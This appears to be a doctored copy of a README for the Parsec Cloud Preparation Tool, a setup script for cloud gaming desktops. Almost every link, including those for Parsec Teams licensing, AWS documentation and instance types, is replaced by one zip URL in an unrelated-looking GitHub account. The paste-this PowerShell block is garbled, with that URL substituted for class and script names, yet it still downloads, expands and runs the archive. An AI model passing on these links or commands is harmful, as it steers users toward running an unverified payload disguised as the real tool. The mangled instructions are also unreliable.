...
If you are an IT person or business owner who is looking to roll out Parsec enabled cloud desktops for your business, you must license a [Parsec Teams subscription](https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip).
...
```
[https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip]::SecurityProtocol = "tls12, tls11, tls" 
$ScriptWebArchive = "https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip"  
$LocalArchivePath = "$ENV:UserProfile\Downloads\Parsec-Cloud-Preparation-Tool"  
(New-Object https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip).DownloadFile($ScriptWebArchive, "$https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip")  
Expand-Archive "$https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip" -DestinationPath $LocalArchivePath -Force  
CD $LocalArchivePath\Parsec-Cloud-Preparation-Tool-master\ | https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip .\https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip  
```
...
AWS https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip   (Tesla T4 with vGaming driver)  
...
```
example: https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip
```  
...
A. You didn't create the AMI correctly. You should search for "Run Sysprep with EC2Launch" on [this page](https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip).  It's important when using the tool, you select"
...
https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip .\https://github.com/jingtra123/Parsec-Cloud-Preparation-Tool/raw/refs/heads/master/presurround/Parsec-Preparation-Tool-Cloud-v3.2.zip -DontPromptPasswordUpdateGPU
```
